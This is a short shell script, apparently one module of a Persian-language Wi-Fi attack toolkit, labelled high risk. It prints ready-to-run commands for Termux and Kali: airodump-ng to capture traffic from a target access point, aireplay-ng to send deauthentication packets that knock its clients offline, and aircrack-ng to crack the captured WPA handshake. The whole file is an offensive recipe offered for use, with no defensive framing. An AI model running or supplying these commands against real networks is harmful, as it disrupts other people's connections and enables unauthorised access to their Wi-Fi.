DESC="گرفتن هندشیک WPA با دی‌اتنت"
REQ="کارت مانیتور + کلاینت فعال روی هدف"
RISK="HIGH"

termux(){
cat <<'EOF'
su -c "airodump-ng -c <CH> --bssid <BSSID> -w cap wlan0"
# در ترمینال دوم:
su -c "aireplay-ng --deauth 10 -a <BSSID> wlan0"
EOF
}

kali(){
cat <<'EOF'
sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w cap wlan0mon
# ترمینال دوم:
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
# وقتی WPA handshake در گوشه‌ی بالا آمد، متوقف کن:
ls -la cap*.cap
aircrack-ng cap-01.cap
EOF
}
